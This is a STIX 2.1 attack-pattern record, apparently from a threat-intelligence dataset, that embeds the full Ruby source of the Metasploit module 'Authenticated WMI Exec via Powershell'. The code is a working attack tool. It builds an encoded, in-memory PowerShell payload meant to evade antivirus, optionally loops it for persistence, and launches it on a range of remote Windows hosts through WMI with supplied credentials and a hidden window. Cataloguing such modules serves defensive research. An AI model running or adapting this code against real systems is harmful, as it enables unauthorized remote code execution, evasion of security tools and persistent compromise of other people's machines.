{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cb07d115-769e-49e0-99d0-6e654e618365",
    "created": "2024-08-14T16:50:07.214024Z",
    "modified": "2024-08-14T16:50:07.214027Z",
    "name": "\"Authenticated WMI Exec via Powershell\"",
    "description": " This module uses WMI execution to launch a payload instance on a remote machine. In order to avoid AV detection, all execution is performed in memory via psh-net encoded payload. Persistence option can be set to keep the payload looping while a handler is present to receive it. By default the module runs as the current process owner. The module can be configured with credentials for the remote host with which to launch the process.  'License'              => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ps_wmi_exec.rb",
            "external_id": "ps_wmi_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Windows::Powershell\n  include Msf::Exploit::Powershell::DotNet\n  include Msf::Post::Windows::Priv\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'                 => \"Authenticated WMI Exec via Powershell\",\n      'Description'          => %q{\n        This module uses WMI execution to launch a payload instance on a remote machine.\n        In order to avoid AV detection, all execution is performed in memory via psh-net\n        encoded payload. Persistence option can be set to keep the payload looping while\n        a handler is present to receive it. By default the module runs as the current\n        process owner. The module can be configured with credentials for the remote host\n        with which to launch the process.\n      },\n      'License'              => MSF_LICENSE,\n      'Author'               => 'RageLtMan <rageltman[at]sempervictus>',\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload' => { 'Space' => 8192 },\n      'Platform'      => [ 'windows' ],\n      'SessionTypes'  => [ 'meterpreter' ],\n      'Targets' => [ [ 'Universal', {} ] ],\n      'DefaultTarget' => 0,\n      'DisclosureDate'=> '2012-08-19'\n\n    ))\n\n    register_options(\n      [\n        OptAddressRange.new(\"RHOSTS\", [ false, \"Target address range or CIDR identifier\" ]),\n        OptString.new('USERNAME', [false, \"Username to authenticate as\"]),\n        OptString.new('PASSWORD', [false, \"Password to authenticate with\"]),\n        OptString.new('DOMAIN', [false, \"Domain or machine name\"]),\n\n      ])\n\n    register_advanced_options(\n      [\n        OptBool.new('PowerShellPersist', [false, 'Run the payload in a loop']),\n        OptBool.new('RunRemoteWow64', [\n          false,\n          'Execute powershell in 32bit compatibility mode, payloads need native arch',\n          false\n        ]),\n\n      ])\n\n  end\n\n  def build_script\n    run_opts = {}\n    run_opts[:username] = datastore['USERNAME']\n    run_opts[:domain] = datastore['DOMAIN'] || '.'\n    run_opts[:password] = datastore['PASSWORD']\n\n    # End of file marker\n    eof = Rex::Text.rand_text_alpha(8)\n    env_suffix = Rex::Text.rand_text_alpha(8)\n\n    # Create base64 encoded payload\n    psh_payload_raw = Msf::Util::EXE.to_win32pe_psh_reflection(framework, payload.raw)\n    if datastore['PowerShellPersist']\n      fun_name = Rex::Text.rand_text_alpha(rand(2)+2)\n      sleep_time = rand(5)+5\n      psh_payload  = \"function #{fun_name}{#{psh_payload}};while(1){Start-Sleep -s #{sleep_time};#{fun_name};1}\"\n    end\n    psh_payload = encode_script(compress_script(psh_payload_raw, eof), eof)\n    # WMI exec function - this is going into powershell.rb after pull 701 is commited\n    script = ps_wmi_exec(run_opts)\n    # Build WMI exec calls to every host into the script to reduce PS instances\n    # Need to address arch compat issue here, check powershell.exe arch, check pay arch\n    # split the hosts into wow64 and native, and run each range separately\n    ps_bin = datastore['RunRemoteWow64'] ? 'cmd /c %windir%\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe' : 'powershell.exe'\n    # for whatever reason, passing %systemroot% instead of 'C:\\windows' fails\n\n    if datastore[\"RHOSTS\"]\n      # Iterate through our hosts list adding a call to the WMI wrapper for each.\n      # This should learn to differentiate between hosts and call WOW64 as appropriate,\n      # as well as putting the payload into a variable when many hosts are hit so the\n      # uploaded script is not bloated since each encoded payload is bulky.\n\n      Rex::Socket::RangeWalker.new(datastore[\"RHOSTS\"]).each do |host|\n        if run_opts[:username] and run_opts[:password]\n          script << \" New-RemoteProcess -rhost \\\"#{host}\\\" -login \\\"#{run_opts[:domain]}\\\\#{run_opts[:username]}\\\"\"\n          script << \" -pass '#{run_opts[:password]}' -cmd \\\"#{ps_bin} -EncodedCommand #{psh_payload}\\\";\"\n        else\n          script << \" New-RemoteProcess -rhost \\\"#{host}\\\" -cmd \\\"#{ps_bin} -EncodedCommand #{psh_payload}\\\";\"\n        end\n      end\n    else\n      print_status('Running Locally')\n      script = psh_payload_raw\n    end\n    return script\n  end\n\n  def exploit\n    # Make sure we meet the requirements before running the script\n    unless have_powershell?\n      fail_with(Failure::BadConfig, 'PowerShell not found')\n    end\n\n\n    # SYSTEM doesnt have credentials on remote hosts\n    if is_system? and datastore['RHOSTS']\n      print_error(\"Cannot run as local system on remote hosts\")\n      return 0\n    end\n\n    script = build_script\n\n    if datastore['Powershell::Post::dry_run']\n      print_good script\n      return\n    end\n\n    begin\n      psh_output = datastore[\"RHOSTS\"] ? psh_exec(script) : psh_exec(script,true,false)\n      print_good(psh_output)\n    rescue Rex::TimeoutError => e\n      elog(e)\n    end\n\n    vprint_good('PSH WMI exec is complete.')\n  end\n\n  # Wrapper function for instantiating a WMI win32_process\n  # class object in powershell.\n  # Insantiates the [wmiclass] object and configures the scope\n  # Sets impersonation level and injects credentials as needed\n  # Configures application startup options to hide the newly\n  # created window. Adds start-up check for remote proc.\n  def ps_wmi_exec(opts = {})\n\n    ps_wrapper = <<EOS\nFunction New-RemoteProcess {\n    Param([string]$rhost,[string]$cmd,[string]$login,[string]$pass)\n    $ErrorActionPreference=\"SilentlyContinue\"\n  $proc = [WMIClass]\"\\\\\\\\$rhost\\\\root\\\\cimv2:Win32_Process\"\nEOS\n  if opts[:username] and opts[:password]\n    ps_wrapper += <<EOS\n  $proc.psbase.Scope.Options.userName = $login\n  $proc.psbase.Scope.Options.Password = $pass\nEOS\n  end\n  ps_wrapper += <<EOS\n  $proc.psbase.Scope.Options.Impersonation = [System.Management.ImpersonationLevel]::Impersonate\n  $proc.psbase.Scope.Options.Authentication = [System.Management.AuthenticationLevel]::PacketPrivacy\n  $startup = [wmiclass]\"Win32_ProcessStartup\"\n  $startup.Properties['ShowWindow'].value=$False\n  $remote = $proc.Create($cmd,'C:\\\\',$startup)\n  if ($remote.returnvalue -eq 0) {\n    Write-Host \"Successfully launched on $rhost with a process id of\" $remote.processid\n  } else {\n    Write-Host \"Failed to launch on $rhost. ReturnValue is\" $remote.ReturnValue\n  }\n}\n\nEOS\n\n    return ps_wrapper\n  end\nend\n\n\n#\n# Ideally the methods to create WMI wrapper functions and their callers\n# should be in /lib/msf/core/post/windows/powershell/ps_wmi.rb.\n#\n",
    "x_mitre_disclosure_date": "2012-08-19",
    "x_mitre_platforms": [
        "[ 'windows' ]"
    ]
}